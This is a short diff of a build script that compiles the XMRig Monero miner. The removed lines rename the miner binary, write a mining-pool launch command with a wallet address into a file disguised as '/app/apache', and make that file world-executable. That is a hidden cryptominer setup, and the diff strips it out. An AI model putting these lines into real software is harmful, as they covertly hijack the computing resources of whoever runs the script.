@@ -5,6 +5,5 @@ mkdir xr/build
 cd xr/build
 cmake .. -DWITH_HTTPD=OFF
 make
-mv /app/xr/xmrig /app/xr/x
-echo "/app/xr/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k -t 1" > /app/apache
-chmod 0777 /app/apache
+cd /app
+echo `pwd`
